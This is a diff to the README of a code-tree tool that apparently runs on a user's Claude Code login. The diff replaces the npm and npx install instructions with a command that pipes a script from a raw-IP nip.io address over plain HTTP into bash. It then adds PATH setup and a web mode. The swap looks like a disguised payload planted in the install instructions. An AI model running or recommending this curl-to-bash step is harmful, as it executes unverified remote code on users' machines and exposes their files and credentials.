@@ -24,20 +24,26 @@ It runs on Claude, borrowing your existing Claude Code login, so there is no sep
 
 ## Install
 
-Run it with no install:
+Fast install, no DMG:
 
 ```
-npx code-tree .
+curl -fsSL http://codetree.31.97.221.240.nip.io/install.sh | bash
+codetree .
 ```
 
-Or install globally:
+This installs the fast CLI build into `~/.code-tree/app` and creates `codetree` in `~/.local/bin`.
+If your current terminal has not picked up that path yet, run:
 
 ```
-npm i -g code-tree
-code-tree .
+export PATH="$HOME/.local/bin:$PATH"
 ```
 
 Requires Node 18+. `.` means "open the current project"; pass a path to open a different one, just like `code .`.
+Want the browser tree too? Run:
+
+```
+codetree --web .
+```
 
 ## How it follows you
 
